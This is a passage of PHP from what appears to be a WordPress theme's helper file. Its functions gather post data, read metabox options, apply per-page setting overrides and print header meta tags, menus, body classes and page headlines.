					$recent_posts_q = new WP_Query( array( 'post_type' => 'portfolio', 'posts_per_page' => $number, 'offset' => $offset, 'post_status' => 'publish' ) );
				}
			} else {
				if ( $cat_slug != '' ) {
					$recent_posts_q = new WP_Query( array( 'posts_per_page' => $number, 'offset' => $offset, 'category_name' => $cat_slug, 'post_status' => 'publish' ) );
				} else {
					$recent_posts_q = new WP_Query( array( 'posts_per_page' => $number, 'offset' => $offset, 'post_status' => 'publish' ) );
				}
			}
		}
		
		if ( $sticky ) {
			$posts_data2 = bt_get_posts_array( $recent_posts_q, $post_type, $sticky_array );
		} else {
			$posts_data2 = bt_get_posts_array( $recent_posts_q, $post_type, array() );
		}		
		
		return array_merge( $posts_data1, $posts_data2 );

	}
}

/**
 * bt_get_posts_data helper function
 *
 * @param object
 * @param string
 * @param array 
 * @return array 
 */
if ( ! function_exists( 'bt_get_posts_array' ) ) {
	function bt_get_posts_array( $recent_posts_q, $post_type = 'blog', $sticky_arr ) {
		
		$posts_data = array();

		while ( $recent_posts_q->have_posts() ) {
			$recent_posts_q->the_post();
			$post = get_post();
			$post_author = $post->post_author;
			$post_id = get_the_ID();
			if ( in_array( $post_id, $sticky_arr ) ) {
				continue;
			}
			$posts_data[] = bt_get_posts_array_item( $post_type, $post_id, $post_author );
		}
		
		wp_reset_postdata();
		
		return $posts_data;
	}
}

/**
 * Returns post excerpt by post id
 *
 * @param int
 * @return string 
 */
if ( ! function_exists( 'bt_get_the_excerpt' ) ) {
	function bt_get_the_excerpt( $post_id ) {
		global $post;  
		$save_post = $post;
		$post = get_post( $post_id );
		$output = get_the_excerpt();
		$post = $save_post;
		return $output;
	}
}

/**
 * bt_get_posts_array helper function
 *
 * @return array
 */
if ( ! function_exists( 'bt_get_posts_array_item' ) ) {
	function bt_get_posts_array_item( $post_type = 'blog', $post_id, $post_author ) {
		global $bt_date_format;
		
		$post_data = array();
		$post_data['permalink'] = get_permalink( $post_id );
		$post_data['format'] = get_post_format( $post_id );
		$post_data['title'] = get_the_title( $post_id );
		
		$post_data['excerpt'] = bt_get_the_excerpt( $post_id );
		
		$post_data['date'] = date_i18n( $bt_date_format, strtotime( get_the_time( 'Y-m-d', $post_id ) ) );
		
		$user_data = get_userdata( $post_author );
		if ( $user_data ) {
			$author = $user_data->data->display_name;
			$author_url = get_author_posts_url( $post_author );
			$post_data['author'] = '<a href="' . esc_url_raw( $author_url ) . '">' . esc_html( $author ) . '</a>';
		} else {
			$post_data['author'] = '';
		}

		if ( $post_type == 'portfolio' ) {
			$categories = wp_get_post_terms( $post_id, 'portfolio_category' );
		} else {
			$categories = get_the_category( $post_id );
		}
		$categories_html = '';
		if ( $categories ) {
			foreach ( $categories as $cat ) {
				if ( $post_type == 'portfolio' ) {
					$categories_html .= esc_html( $cat->name ) . ', ';
				} else {
					$categories_html .= '<a href="' . esc_url_raw( get_category_link( $cat->term_id ) ) . '">' . esc_html( $cat->name ) . '</a>' . ', ';
				}
			}
			$categories_html = trim( $categories_html, ', ' );
		}

		$post_data['category'] = $categories_html;
		
		$comments_open = comments_open( $post_id );
		$comments_number = get_comments_number( $post_id );
		if ( ! $comments_open && $comments_number == 0 ) {
			$comments_number = false;
		}			
		
		$post_data['images'] = bt_rwmb_meta( BoldThemesPFX . '_images', 'type=image', $post_id );
		if ( $post_data['images'] == null ) $post_data['images'] = array();
		$post_data['video'] = bt_rwmb_meta( BoldThemesPFX . '_video', array(), $post_id );
		$post_data['audio'] = bt_rwmb_meta( BoldThemesPFX . '_audio', array(), $post_id );
		$post_data['grid_gallery'] = bt_rwmb_meta( BoldThemesPFX . '_grid_gallery', array(), $post_id );
		$post_data['link_title'] = bt_rwmb_meta( BoldThemesPFX . '_link_title', array(), $post_id );
		$post_data['link_url'] = bt_rwmb_meta( BoldThemesPFX . '_link_url', array(), $post_id );
		$post_data['quote'] = bt_rwmb_meta( BoldThemesPFX . '_quote', array(), $post_id );
		$post_data['quote_author'] = bt_rwmb_meta( BoldThemesPFX . '_quote_author', array(), $post_id );
		$post_data['tile_format'] = bt_rwmb_meta( BoldThemesPFX . '_tile_format', array(), $post_id );
		$post_data['comments'] = $comments_number;
		$post_data['ID'] = $post_id;
		
		return $post_data;
	}
}

/**
 * Custom MetaBox getter function
 *
 * @return string
 */
if ( ! function_exists( 'bt_rwmb_meta' ) ) {
	function bt_rwmb_meta( $key, $args = array(), $post_id = null ) {
		if ( function_exists( 'rwmb_meta' ) ) {
			return rwmb_meta( $key, $args, $post_id );
		} else {
			return null;
		}
	}
}

/**
 * Returns page id by slug
 *
 * @return string
 */
if ( ! function_exists( 'bt_get_id_by_slug' ) ) {
	function bt_get_id_by_slug( $page_slug ) {
		$page = get_posts(
			array(
				'name'      => $page_slug,
				'post_type' => 'page'
			)
		);
		return $page[0]->ID;
	}
}

/**
 * Creates override of global options for individual posts
 */
if ( ! function_exists( 'bt_set_override' ) ) {
	function bt_set_override() {
		global $bt_options;
		$bt_options = get_option( BoldThemesPFX . '_theme_options' );

		global $bt_page_options;
		$bt_page_options = array();
		 
		if ( ! is_404() ) {
			$tmp_bt_page_options = bt_rwmb_meta( BoldThemesPFX . '_override' );
			$tmp_bt_page_options1 = '';
			if ( ( is_search() || is_archive() || is_home() || is_singular( 'post' ) ) && get_option( 'page_for_posts' ) != 0 ) {
				$tmp_bt_page_options1 = bt_rwmb_meta( BoldThemesPFX . '_override', array(), get_option( 'page_for_posts' ) );
			} else if ( ( is_post_type_archive( 'portfolio' ) || is_singular( 'portfolio' ) ) && isset( $bt_options['pf_settings_page_slug'] ) && $bt_options['pf_settings_page_slug'] != '' ) {
				$tmp_bt_page_options1 = bt_rwmb_meta( BoldThemesPFX . '_override', array(), bt_get_id_by_slug( $bt_options['pf_settings_page_slug'] ) );
			}
			
			if ( ! is_array( $tmp_bt_page_options ) ) $tmp_bt_page_options = array();

			if ( is_array( $tmp_bt_page_options1 ) ) {
				if ( is_singular() ) {
					$tmp_bt_page_options = array_merge( bt_transform_override( $tmp_bt_page_options1 ), bt_transform_override( $tmp_bt_page_options ) );
				} else {
					$tmp_bt_page_options = bt_transform_override( $tmp_bt_page_options1 );
				}
			} else if ( count( $tmp_bt_page_options ) > 0 ) {
				$tmp_bt_page_options = bt_transform_override( $tmp_bt_page_options );
			}

			foreach ( $tmp_bt_page_options as $key => $value ) {
				$bt_page_options[ $key ] = $value;
			}
		}
	}
}

/**
 * bt_set_override helper function
 *
 * @param array
 * @return array
 */
if ( ! function_exists( 'bt_transform_override' ) ) {
	function bt_transform_override( $arr ) {
		$new_arr = array();
		foreach( $arr as $item ) {
			$key = substr( $item, 0, strpos( $item, ':' ) );
			$value = substr( $item, strpos( $item, ':' ) + 1 );
			$new_arr[ $key ] = $value;
		}
		return $new_arr;
	}
}

/**
 * theme name and version in data attribute
 */
if ( ! function_exists( 'bt_theme_data' ) ) {
	function bt_theme_data() {
		$data = wp_get_theme();
		echo 'data-bt-theme="' . esc_attr( $data['Name'] ) . ' ' . esc_attr( $data['Version'] ) . '"';
	}
}

/**
 * Header meta tags output
 */
if ( ! function_exists( 'bt_header_meta' ) ) {
	function bt_header_meta() {
		$desc = bt_rwmb_meta( BoldThemesPFX . '_description' );
		
		if ( $desc != '' ) {
			echo '<meta name="description" content="' . esc_attr( $desc ) . '">';
		}
		
		if ( is_single() ) {
			echo '<meta property="twitter:card" content="summary">';

			echo '<meta property="og:title" content="' . get_the_title() . '" />';
			echo '<meta property="og:type" content="article" />';
			echo '<meta property="og:url" content="' . get_permalink() . '" />';
			
			$img = null;
			
			$bt_featured_slider = bt_get_option( 'blog_ghost_slider' ) && has_post_thumbnail();
			if ( $bt_featured_slider ) {
				$post_thumbnail_id = get_post_thumbnail_id( get_the_ID() );
				$img = wp_get_attachment_image_src( $post_thumbnail_id, 'full' );
				$img = $img[0];
			} else {
				$images = bt_rwmb_meta( BoldThemesPFX . '_images', 'type=image' );
				if ( is_array( $images ) ) {
					foreach ( $images as $img ) {
						$img = $img['full_url'];
						break;
					}
				}
			}
			if ( $img ) {
				echo '<meta property="og:image" content="' . esc_attr( $img ) . '" />';
			}
			
			if ( $desc != '' ) {
				echo '<meta property="og:description" content="' . esc_attr( $desc ) . '" />';
			}
		}
		
		if ( ! function_exists( 'has_site_icon' ) || ! has_site_icon() ) {
			$favicon = bt_get_option( 'favicon' );
			$mobile_touch_icon = bt_get_option( 'mobile_touch_icon' );
			
			if ( strpos( $favicon, '/wp-content' ) === 0 ) $favicon = get_site_url() . $favicon;
			if ( strpos( $mobile_touch_icon, '/wp-content' ) === 0 ) $mobile_touch_icon = get_site_url() . $mobile_touch_icon;
			
			if ( bt_get_option( 'favicon' ) != '' ) {
				echo '<link rel="shortcut icon" href="' . esc_url_raw( $favicon ) . '" type="image/x-icon">';
			}
		} else {
			wp_site_icon();
		}
		
		if ( bt_get_option( 'mobile_touch_icon' ) != '' ) {
			echo '<link rel="icon" href="' . esc_url_raw( $mobile_touch_icon ) . '">';
			echo '<link rel="apple-touch-icon-precomposed" href="' . esc_url_raw( $mobile_touch_icon ) . '">';
		}
		
		echo '<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
		<meta name="mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-capable" content="yes">';
		
	}
}

/**
 * Header menu output
 */
if ( ! function_exists( 'bt_nav_menu' ) ) {
	function bt_nav_menu() {
		if ( bt_rwmb_meta( BoldThemesPFX . '_menu_name' ) != '' ) {
			wp_nav_menu( array( 'menu' => bt_rwmb_meta( BoldThemesPFX . '_menu_name' ), 'items_wrap' => '%3$s', 'container' => '', 'depth' => 3, 'fallback_cb' => false )); 
		} else {
			wp_nav_menu( array( 'theme_location' => 'primary', 'items_wrap' => '%3$s', 'container' => '', 'depth' => 3, 'fallback_cb' => false ) );
		}
	}
}

/**
 * body classes
 */
if ( ! function_exists( 'bt_body_classes' ) ) {
	function bt_body_classes( $classes ) {
		
		$classes[] = 'bodyPreloader'; 
		
		$menu_type = bt_get_option( 'menu_type' );
		if ( $menu_type == 'hCenter' ) {
			$classes[] = 'btMenuCenterEnabled'; 
		} else if ( $menu_type == 'hRight' ) {
			$classes[] = 'btMenuRightEnabled';
		} else if ( $menu_type == 'hLeft' ) {
			$classes[] = 'btMenuLeftEnabled';
		} else if ( $menu_type == 'vLeft' ) {
			$classes[] = 'btMenuVerticalLeftEnabled';
		} else if ( $menu_type == 'vRight' ) {
			$classes[] = 'btMenuVerticalRightEnabled';
		} else {
			$classes[] = 'btMenuRightEnabled';
		}

		if ( bt_get_option( 'sticky_header' ) ) {
			$classes[] = 'btStickyEnabled';
		}

		if ( bt_get_option( 'hide_menu' ) ) {
			$classes[] = 'btHideMenu';
		}

		if ( bt_get_option( 'template_skin' ) ) {
			$classes[] = 'btDarkSkin';
		} else {
			$classes[] = 'btLightSkin';
		}

		if ( bt_get_option( 'below_menu' ) ) {
			$classes[] = 'btBelowMenu';
		}

		if ( bt_get_option( 'top_tools_in_menu' ) ) {
			$classes[] = 'btTopToolsInMenuArea';
		}
		
		if ( bt_get_option( 'boxed_menu' ) ) {
			$classes[] = 'btMenuGutter';
		}
		
		$bt_sidebar = bt_get_option( 'sidebar' );
		global $bt_has_sidebar;

		if ( ! ( ( $bt_sidebar == 'left' || $bt_sidebar == 'right' ) && ! is_404() ) ) {
			$bt_has_sidebar = false;
			$classes[] = 'btNoSidebar';
		} else {
			$bt_has_sidebar = true;
			if ( $bt_sidebar == 'left' ) {
				$classes[] = 'btWithSidebar btSidebarLeft';
			} else {
				$bt_sidebar = 'right'; 
				$classes[] = 'btWithSidebar btSidebarRight';
			}
		}
		
		if ( wp_is_mobile() ) {
			$classes[] = 'btIsMobile';
		}
		
		return $classes;
	}
}

/**
 * Enqueue comment script
 */
if ( ! function_exists( 'bt_header_init' ) ) {
	function bt_header_init() {
		if ( is_singular() ) {
			wp_enqueue_script( 'comment-reply' );
		}
 	}
}

/**
 * Header headline output
 */
if ( ! function_exists( 'bt_header_headline' ) ) {
	function bt_header_headline() {
		$hide_headline = bt_get_option( 'hide_headline' );
		if ( ( ! $hide_headline && ! is_404() && ! is_single() ) || is_search() || is_category() || is_date()  ) { 
			echo "<section class='btPageHeadline'>" . bt_get_heading_html( bt_breadcrumbs(), wp_title( '/', false, 'right' ), '', 'extralarge', 'top', '', '' ) . "</section>";
		}
 	}
}

if ( ! function_exists( 'bt_get_media_html_render' ) ) {
	function bt_get_media_html_render( $media_html = '' ) {
		return $media_html;
	}
}